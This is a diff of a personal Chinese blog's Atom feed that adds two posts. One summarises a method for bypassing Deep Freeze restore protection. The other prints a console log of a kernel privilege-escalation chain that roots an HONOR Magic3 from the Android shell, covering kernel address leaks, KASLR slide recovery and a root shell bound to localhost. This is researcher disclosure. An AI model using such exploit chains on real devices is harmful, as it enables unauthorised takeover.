@@ -3,7 +3,7 @@
   <title>My Blog (zh)</title>
   <link href="https://blog.junyu33.me/atom.xml" rel="self"/>
   <link href="https://blog.junyu33.me/"/>
-  <updated>2026-08-31T15:55:00.000Z</updated>
+  <updated>2026-09-28T10:00:00.000Z</updated>
   <id>https://blog.junyu33.me/</id>
   <entry>
     <title>（置顶）博客元信息一览</title>
@@ -11,6 +11,66 @@
     <id>https://blog.junyu33.me/zh/2038/01/19/meta/</id>
     <updated>2026-07-08T06:30:00.000Z</updated>
     <summary type="html"><![CDATA[<p>列出一些与博客本身相关的元信息，以便于查阅。</p>]]></summary>
+  </entry>
+  <entry>
+    <title>Deep Freeze 忘了密码怎么解冻？</title>
+    <link href="https://blog.junyu33.me/zh/2026/09/28/deepfrz/"/>
+    <id>https://blog.junyu33.me/zh/2026/09/28/deepfrz/</id>
+    <updated>2026-09-28T10:00:00.000Z</updated>
+    <summary type="html"><![CDATA[<p>11 年前，也就是自己六年级的时候，我绕过了 Deep Freeze 的还原保护。</p>
+<p>11 年后，Deep Freeze 居然只更新了两个大版本。现在心血来潮又试了一下，发现自己当年的方法仍然健在，并且还有了新的思路。这篇文章针对的两个版本是：</p>
+<ul>
+<li>Standard 最新版本 9.0.20.5760</li>
+<li>企业版第二新的版本 10.10.220.5788（几天前刚出了 10.20，但貌似目前还拿不到）</li>
+</ul>
+<p>方法在自己的 win7 虚拟机测试，两个版本均通过。仅供个人学习交流使用。</p>]]></summary>
+  </entry>
+  <entry>
+    <title>六四——I pwned an HONOR Magic3 using DeepSeek-V4.1-Flash</title>
+    <link href="https://blog.junyu33.me/zh/2026/09/24/xp3/"/>
+    <id>https://blog.junyu33.me/zh/2026/09/24/xp3/</id>
+    <updated>2026-09-27T10:00:00.000Z</updated>
+    <summary type="html"><![CDATA[<p>经过反复思考，我决定还是把这篇文章放随笔区，因为文章内容的非技术部分还是占比更高。</p>
+<ul>
+<li>Device: Honor ELZ-AN00 · Android 11 · build ELZ-AN00 5.0.0.189(C00E183R6P1)</li>
+<li>Kernel: 5.4.86-qgki-g33a9ed8573e1 #1 SMP PREEMPT aarch64</li>
+<li>Config: user build, locked bootloader, CFI_CLANG + LTO_CLANG + THINLTO (non-GKI)</li>
+<li>Actor: uid 2000, CapEff=0, no root helper</li>
+</ul>
+<pre><code>junyu33@zjy-asus:/mnt/c/Users/junyu33/Desktop$ bash /home/junyu33/elz-phase2/notes/artifacts/root.sh -v &quot;id&quot;
+[check] target-page sha256 = 3720fc0ef95b2c4d654c6a660b211ee00eafac2bb37d85f5697dd483673a19d4
+[chain] starting the chain (uid 2000 -&gt; uid 0), about 40 s
+=== P1: first bounded kernel write on the phone (uid 2000, no root, no GDB) ===
+[0] links: T=0xffffffc012aae588 (ashmem_misc+0x10) read_jt=0xffffffc01182ae6c write_jt=0xffffffc01182b88c open=0xffffffc0101bd7a0 rt_mutex_init_waiter=0xffffffc0103686b4 do_futex=0xffffffc0103b3f04
+[S0-ID] uid=2000 euid=2000 gid=2000 CapEff=0x0 CapPrm=0x0 Seccomp=0 NoNewPrivs=0
+[S0-ENV] uname=5.4.86-qgki-g33a9ed8573e1
+[S0-ENV] getenforce=1 domain=u:r:shell:s0 boot_id=19831966-28f0-4e7a-b177-25b40f829564
+...
+[chain] ready (uid 0 pty on 127.0.0.1:31337, adb forward active)
+--- chain summary (154 lines) ---
+  [S0-ID] uid=2000 euid=2000 gid=2000 CapEff=0x0 CapPrm=0x0 Seccomp=0 NoNewPrivs=0
+  [S0-ENV] uname=5.4.86-qgki-g33a9ed8573e1
+  [S0-ENV] getenforce=1 domain=u:r:shell:s0 boot_id=19831966-28f0-4e7a-b177-25b40f829564
+...
+  [S0-SLIDE] d=0x190 samples=28163 candidates=2 best=0x2bc3a00000 votes=27395 second=135
+  [S0-SLIDE] SLIDE=0x2bc3a00000 runtime_text=0xffffffebd3a80000 runtime_etext=0xffffffebd5240000
+  [S0-SLIDE] kernel IPs in [_text,_etext)=150000/150000
+...
+  [7B] KREAD *(V+0x10)=0xffffffebd522ae6c (==read_jt: 1) *(V+0x18)=0xffffffebd522b88c (==write_jt: 1)
+...
+  [P1C-DAEMON] RESIDENT anchor_pt=/dev/pts/0 anchor_fd=3 window_pipe=held_by_parent listening=127.0.0.1:31337 uid=0 pid=7880
+  [P1C-DAEMON] each connection forks a session child with its OWN pty+shell; this process never exits
+...
+  [CRIT] pos_uid0=1 pos_gid0=1 pos_caps=1 pos_mount0=1 neg1_mount=-1 neg2_uid=2000 init_sid=1870 count_win=1848 sid_written=1 page_ctl=0
+  [END] *(T) restored to 0xffffffebd5cba298 (== ashmem_fops+slide: 1)
+  [T] round segment = 24680 ms
+--- end summary ---
+[shell] id
+id
+:/data/local/tmp # id
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0:c999
+:/data/local/tmp #
+</code></pre>]]></summary>
   </entry>
   <entry>
     <title>六三——父亲、象棋与 AI</title>
@@ -180,24 +240,5 @@
     <updated>2025-11-29T14:00:00.000Z</updated>
     <summary type="html"><![CDATA[<p>再次换新手机后，经过一周的不懈努力，我终于让上上台解了 BL 锁的手机（STF-AL10）刷上了 Lineage。</p>
 <p>这里叙述一下完整的刷机过程。</p>]]></summary>
-  </entry>
-  <entry>
-    <title>有限域运算优化简述</title>
-    <link href="https://blog.junyu33.me/zh/2025/11/17/NTT/"/>
-    <id>https://blog.junyu33.me/zh/2025/11/17/NTT/</id>
-    <updated>2025-11-17T05:50:00.000Z</updated>
-    <summary type="html"><![CDATA[<p>11 月 17 号课堂报告存档。</p>]]></summary>
-  </entry>
-  <entry>
-    <title>（转载）我国法律争取到的文化福利，请视频网站不要拱手让出</title>
-    <link href="https://blog.junyu33.me/zh/2025/10/28/copyleft/"/>
-    <id>https://blog.junyu33.me/zh/2025/10/28/copyleft/</id>
-    <updated>2025-10-28T15:30:00.000Z</updated>
-    <summary type="html"><![CDATA[<p>我们的每一次退让，都在将公众利益拱手让出；版权大鳄权利的不断膨胀，最终将导致文化的末日。</p>
-<blockquote>
-<p>原文作者：马小褂</p>
-<p>发布时间：2018-05-09 22:38</p>
-<p>原文地址：<a href="https://zhuanlan.zhihu.com/p/36656157">https://zhuanlan.zhihu.com/p/36656157</a></p>
-</blockquote>]]></summary>
   </entry>
 </feed>
